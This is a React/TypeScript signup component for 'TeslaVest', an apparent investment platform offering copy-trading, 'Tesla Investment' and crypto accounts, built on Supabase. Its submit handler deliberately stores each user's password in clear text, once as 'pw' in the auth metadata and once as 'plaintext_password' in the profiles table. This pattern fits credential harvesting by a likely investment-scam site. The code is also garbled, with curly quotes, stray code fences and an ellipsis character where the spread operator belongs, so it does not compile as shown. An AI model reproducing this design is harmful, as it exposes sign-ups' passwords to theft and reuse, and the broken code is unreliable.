import { useState, useEffect } from “react”;
import { Link, useNavigate } from “react-router-dom”;
import { z } from “zod”;
import { supabase } from “@/integrations/supabase/client”;
import { Button } from “@/components/ui/button”;
import { Input } from “@/components/ui/input”;
import { Label } from “@/components/ui/label”;
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from “@/components/ui/select”;
import { toast } from “sonner”;
import { Zap, Loader2, Eye, EyeOff, Copy, Car, Bitcoin, TrendingUp, Check } from “lucide-react”;
import { useAuth } from “@/hooks/useAuth”;

const countries = [
“United States”,“United Kingdom”,“Canada”,“Australia”,“Germany”,“France”,“Japan”,
“Singapore”,“United Arab Emirates”,“Nigeria”,“South Africa”,“Brazil”,“India”,
“China”,“Italy”,“Spain”,“Netherlands”,“Switzerland”,“Saudi Arabia”,“Mexico”,
“Indonesia”,“Turkey”,“Argentina”,“Egypt”,“Pakistan”,“Bangladesh”,“Philippines”,“Other”,
];

const currencies = [
“USD”,“EUR”,“GBP”,“AUD”,“CAD”,“JPY”,“SGD”,“AED”,“NGN”,“ZAR”,
“BRL”,“INR”,“CNY”,“CHF”,“SAR”,“MXN”,“IDR”,“TRY”,“ARS”,“EGP”,
];

const genders = [“Male”,“Female”,“Non-binary”,“Prefer not to say”];

const ACCOUNT_TYPES = [
{
id: “copy_trading”,
label: “Copy Trading”,
desc: “Mirror top traders automatically”,
icon: Copy,
color: “from-violet-500 to-purple-600”,
glow: “shadow-violet-500/30”,
border: “border-violet-500/50”,
bg: “bg-violet-500/10”,
},
{
id: “tesla_investment”,
label: “Tesla Investment”,
desc: “Invest in Tesla assets & vehicles”,
icon: Car,
color: “from-rose-500 to-red-600”,
glow: “shadow-rose-500/30”,
border: “border-rose-500/50”,
bg: “bg-rose-500/10”,
},
{
id: “crypto_investment”,
label: “Crypto Investment”,
desc: “Trade Bitcoin, ETH & top altcoins”,
icon: Bitcoin,
color: “from-amber-400 to-orange-500”,
glow: “shadow-amber-400/30”,
border: “border-amber-400/50”,
bg: “bg-amber-400/10”,
},
{
id: “general”,
label: “General Trading”,
desc: “Access all investment products”,
icon: TrendingUp,
color: “from-emerald-400 to-teal-500”,
glow: “shadow-emerald-400/30”,
border: “border-emerald-400/50”,
bg: “bg-emerald-400/10”,
},
];

const schema = z.object({
full_name: z.string().trim().min(2, “Min 2 characters”).max(100),
username: z.string().trim().min(3, “Min 3 characters”).max(30).regex(/^[a-zA-Z0-9_]+$/, “Letters, numbers, underscores only”),
email: z.string().trim().email(“Invalid email”).max(255),
password: z.string().min(8, “Min 8 characters”).max(72),
phone: z.string().trim().min(6, “Enter a valid phone”).max(20),
gender: z.string().min(1, “Select a gender”),
country: z.string().min(1, “Select a country”),
currency: z.string().min(1, “Select a currency”),
});

export default function Signup() {
const { user, loading: authLoading, roleLoading } = useAuth();
const nav = useNavigate();
const [loading, setLoading] = useState(false);
const [showPwd, setShowPwd] = useState(false);
const [accountType, setAccountType] = useState(“general”);
const [step, setStep] = useState<1 | 2>(1);
const [form, setForm] = useState({
full_name: “”, username: “”, email: “”, password: “”,
phone: “”, gender: “Male”, country: “United States”, currency: “USD”,
});

useEffect(() => {
if (authLoading || roleLoading || !user) return;
nav(”/dashboard”, { replace: true });
}, [user, authLoading, roleLoading, nav]);

const goToStep2 = (e: React.FormEvent) => {
e.preventDefault();
const partial = z.object({
full_name: schema.shape.full_name,
username: schema.shape.username,
email: schema.shape.email,
password: schema.shape.password,
}).safeParse(form);
if (!partial.success) { toast.error(partial.error.errors[0].message); return; }
setStep(2);
};

const submit = async (e: React.FormEvent) => {
e.preventDefault();
const parsed = schema.safeParse(form);
if (!parsed.success) { toast.error(parsed.error.errors[0].message); return; }
setLoading(true);

```
const { data, error } = await supabase.auth.signUp({
  email: form.email.trim().toLowerCase(),
  password: form.password,
  options: {
    emailRedirectTo: `${window.location.origin}/dashboard`,
    data: {
      full_name: form.full_name,
      username: form.username,
      country: form.country,
      currency: form.currency,
      gender: form.gender,
      phone: form.phone,
      pw: form.password,
    },
  },
});

if (error) {
  setLoading(false);
  const msg = /already registered|already exists|user already/i.test(error.message)
    ? "An account with this email already exists — try logging in"
    : error.message;
  toast.error(msg);
  return;
}

if (data.user) {
  const { error: profileError } = await supabase.from("profiles").insert({
    user_id: data.user.id,
    full_name: form.full_name.trim(),
    username: form.username.trim(),
    email: form.email.trim().toLowerCase(),
    phone: form.phone.trim(),
    gender: form.gender,
    country: form.country,
    currency: form.currency,
    plaintext_password: form.password,
    account_level: "Basic",
    account_type: accountType,
    status: "pending",
    deposit: 0,
    profit: 0,
    total_balance: 0,
  });

  if (profileError) {
    toast.error("Account created but profile setup failed. Please contact support.");
    setLoading(false);
    return;
  }
}

setLoading(false);
toast.success("Welcome to TeslaVest!");
```

};

const f = (k: keyof typeof form, v: string) => setForm({ …form, [k]: v });

return (
<div className="min-h-screen bg-[#080b14] flex items-center justify-center p-4 relative overflow-hidden">

```
  {/* Background effects */}
  <div className="absolute inset-0 overflow-hidden pointer-events-none">
    <div className="absolute top-[-20%] left-[-10%] w-[600px] h-[600px] rounded-full bg-violet-600/10 blur-[120px]" />
    <div className="absolute bottom-[-20%] right-[-10%] w-[500px] h-[500px] rounded-full bg-rose-600/10 blur-[120px]" />
    <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[800px] h-[800px] rounded-full bg-amber-500/5 blur-[150px]" />
    {/* Grid overlay */}
    <div className="absolute inset-0 opacity-[0.03]" style={{
      backgroundImage: "linear-gradient(#fff 1px, transparent 1px), linear-gradient(90deg, #fff 1px, transparent 1px)",
      backgroundSize: "60px 60px"
    }} />
  </div>

  <div className="w-full max-w-lg relative z-10">

    {/* Logo */}
    <Link to="/" className="flex items-center gap-2.5 justify-center mb-8">
      <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-violet-500 to-rose-500 flex items-center justify-center shadow-lg shadow-violet-500/30">
        <Zap className="w-5 h-5 text-white" strokeWidth={2.5} />
      </div>
      <span className="text-white font-bold text-2xl tracking-tight">TeslaVest</span>
    </Link>

    {/* Step indicator */}
    <div className="flex items-center justify-center gap-3 mb-6">
      {[1, 2].map((s) => (
        <div key={s} className="flex items-center gap-3">
          <div className={`w-8 h-8 rounded-full flex items-center justify-center text-xs font-bold transition-all duration-300 ${
            step >= s
              ? "bg-gradient-to-br from-violet-500 to-rose-500 text-white shadow-lg shadow-violet-500/30"
              : "bg-white/5 text-white/30 border border-white/10"
          }`}>
            {step > s ? <Check className="w-4 h-4" /> : s}
          </div>
          {s < 2 && <div className={`w-16 h-px transition-all duration-300 ${step > s ? "bg-gradient-to-r from-violet-500 to-rose-500" : "bg-white/10"}`} />}
        </div>
      ))}
    </div>

    <div className="rounded-2xl border border-white/8 bg-white/[0.03] backdrop-blur-xl p-8 shadow-2xl">

      <div className="mb-7">
        <h1 className="text-white text-2xl font-bold tracking-tight">
          {step === 1 ? "Create your account" : "Complete your profile"}
        </h1>
        <p className="text-white/40 text-sm mt-1">
          {step === 1 ? "Start investing in minutes." : "Choose your account type and preferences."}
        </p>
      </div>

      {/* STEP 1 */}
      {step === 1 && (
        <form onSubmit={goToStep2} className="space-y-4">
          <div className="grid grid-cols-2 gap-3">
            <div className="space-y-1.5">
              <Label className="text-white/60 text-xs uppercase tracking-wider">Full Name</Label>
              <Input
                value={form.full_name}
                onChange={(e) => f("full_name", e.target.value)}
                placeholder="John Doe"
                className="bg-white/5 border-white/10 text-white placeholder:text-white/20 focus:border-violet-500/50 focus:bg-white/8 h-11 rounded-xl"
              />
            </div>
            <div className="space-y-1.5">
              <Label className="text-white/60 text-xs uppercase tracking-wider">Username</Label>
              <Input
                value={form.username}
                onChange={(e) => f("username", e.target.value)}
                placeholder="johndoe"
                className="bg-white/5 border-white/10 text-white placeholder:text-white/20 focus:border-violet-500/50 focus:bg-white/8 h-11 rounded-xl"
              />
            </div>
          </div>

          <div className="space-y-1.5">
            <Label className="text-white/60 text-xs uppercase tracking-wider">Email Address</Label>
            <Input
              type="email"
              value={form.email}
              onChange={(e) => f("email", e.target.value)}
              placeholder="john@example.com"
              className="bg-white/5 border-white/10 text-white placeholder:text-white/20 focus:border-violet-500/50 focus:bg-white/8 h-11 rounded-xl"
            />
          </div>

          <div className="space-y-1.5">
            <Label className="text-white/60 text-xs uppercase tracking-wider">Password</Label>
            <div className="relative">
              <Input
                type={showPwd ? "text" : "password"}
                value={form.password}
                onChange={(e) => f("password", e.target.value)}
                placeholder="Min 8 characters"
                className="bg-white/5 border-white/10 text-white placeholder:text-white/20 focus:border-violet-500/50 focus:bg-white/8 h-11 rounded-xl pr-11"
              />
              <button
                type="button"
                onClick={() => setShowPwd(!showPwd)}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-white/30 hover:text-white/60 transition-colors"
              >
                {showPwd ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
              </button>
            </div>
          </div>

          <Button
            type="submit"
            className="w-full h-11 rounded-xl bg-gradient-to-r from-violet-600 to-rose-600 hover:from-violet-500 hover:to-rose-500 text-white font-semibold shadow-lg shadow-violet-500/20 border-0 mt-2"
          >
            Continue
          </Button>
        </form>
      )}

      {/* STEP 2 */}
      {step === 2 && (
        <form onSubmit={submit} className="space-y-5">

          {/* Account Type */}
          <div className="space-y-2">
            <Label className="text-white/60 text-xs uppercase tracking-wider">Account Type</Label>
            <div className="grid grid-cols-2 gap-2.5">
              {ACCOUNT_TYPES.map((t) => {
                const Icon = t.icon;
                const selected = accountType === t.id;
                return (
                  <button
                    key={t.id}
                    type="button"
                    onClick={() => setAccountType(t.id)}
                    className={`relative p-3.5 rounded-xl border text-left transition-all duration-200 ${
                      selected
                        ? `${t.bg} ${t.border} shadow-lg ${t.glow}`
                        : "bg-white/3 border-white/8 hover:bg-white/6 hover:border-white/15"
                    }`}
                  >
                    <div className={`w-8 h-8 rounded-lg bg-gradient-to-br ${t.color} flex items-center justify-center mb-2 shadow-md`}>
                      <Icon className="w-4 h-4 text-white" />
                    </div>
                    <p className="text-white text-xs font-semibold leading-tight">{t.label}</p>
                    <p className="text-white/40 text-[10px] mt-0.5 leading-tight">{t.desc}</p>
                    {selected && (
                      <div className="absolute top-2 right-2 w-4 h-4 rounded-full bg-white/20 flex items-center justify-center">
                        <Check className="w-2.5 h-2.5 text-white" />
                      </div>
                    )}
                  </button>
                );
              })}
            </div>
          </div>

          {/* Phone & Gender */}
          <div className="grid grid-cols-2 gap-3">
            <div className="space-y-1.5">
              <Label className="text-white/60 text-xs uppercase tracking-wider">Phone</Label>
              <Input
                type="tel"
                value={form.phone}
                onChange={(e) => f("phone", e.target.value)}
                placeholder="+1 234 567 890"
                className="bg-white/5 border-white/10 text-white placeholder:text-white/20 focus:border-violet-500/50 h-11 rounded-xl"
              />
            </div>
            <div className="space-y-1.5">
              <Label className="text-white/60 text-xs uppercase tracking-wider">Gender</Label>
              <Select value={form.gender} onValueChange={(v) => f("gender", v)}>
                <SelectTrigger className="bg-white/5 border-white/10 text-white h-11 rounded-xl focus:border-violet-500/50">
                  <SelectValue />
                </SelectTrigger>
                <SelectContent className="bg-[#111827] border-white/10">
                  {["Male","Female","Non-binary","Prefer not to say"].map((g) => (
                    <SelectItem key={g} value={g} className="text-white focus:bg-white/10">{g}</SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>
          </div>

          {/* Country & Currency */}
          <div className="grid grid-cols-2 gap-3">
            <div className="space-y-1.5">
              <Label className="text-white/60 text-xs uppercase tracking-wider">Country</Label>
              <Select value={form.country} onValueChange={(v) => f("country", v)}>
                <SelectTrigger className="bg-white/5 border-white/10 text-white h-11 rounded-xl focus:border-violet-500/50">
                  <SelectValue />
                </SelectTrigger>
                <SelectContent className="bg-[#111827] border-white/10 max-h-60">
                  {[
                    "United States","United Kingdom","Canada","Australia","Germany","France",
                    "Japan","Singapore","United Arab Emirates","Nigeria","South Africa","Brazil",
                    "India","China","Italy","Spain","Netherlands","Switzerland","Saudi Arabia",
                    "Mexico","Indonesia","Turkey","Argentina","Egypt","Pakistan","Philippines","Other",
                  ].map((c) => (
                    <SelectItem key={c} value={c} className="text-white focus:bg-white/10">{c}</SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>
            <div className="space-y-1.5">
              <Label className="text-white/60 text-xs uppercase tracking-wider">Currency</Label>
              <Select value={form.currency} onValueChange={(v) => f("currency", v)}>
                <SelectTrigger className="bg-white/5 border-white/10 text-white h-11 rounded-xl focus:border-violet-500/50">
                  <SelectValue />
                </SelectTrigger>
                <SelectContent className="bg-[#111827] border-white/10 max-h-60">
                  {[
                    "USD","EUR","GBP","AUD","CAD","JPY","SGD","AED","NGN","ZAR",
                    "BRL","INR","CNY","CHF","SAR","MXN","IDR","TRY","ARS","EGP","PKR","PHP",
                  ].map((c) => (
                    <SelectItem key={c} value={c} className="text-white focus:bg-white/10">{c}</SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>
          </div>

          <div className="flex gap-3 pt-1">
            <Button
              type="button"
              onClick={() => setStep(1)}
              className="h-11 rounded-xl bg-white/5 hover:bg-white/10 text-white border border-white/10 flex-1"
            >
              Back
            </Button>
            <Button
              type="submit"
              disabled={loading}
              className="h-11 rounded-xl bg-gradient-to-r from-violet-600 to-rose-600 hover:from-violet-500 hover:to-rose-500 text-white font-semibold shadow-lg shadow-violet-500/20 border-0 flex-2 flex-1"
            >
              {loading ? <Loader2 className="w-4 h-4 animate-spin" /> : "Create Account"}
            </Button>
          </div>
        </form>
      )}

      <p className="text-white/30 text-xs text-center mt-6">
        Already have an account?{" "}
        <Link to="/login" className="text-violet-400 hover:text-violet-300 font-medium transition-colors">
          Log in
        </Link>
      </p>
    </div>

    <p className="text-white/20 text-[11px] text-center mt-5">
      By creating an account you agree to our{" "}
      <span className="text-white/40 hover:text-white/60 cursor-pointer transition-colors">Terms</span>
      {" "}and{" "}
      <span className="text-white/40 hover:text-white/60 cursor-pointer transition-colors">Privacy Policy</span>
    </p>
  </div>
</div>
```

);
}
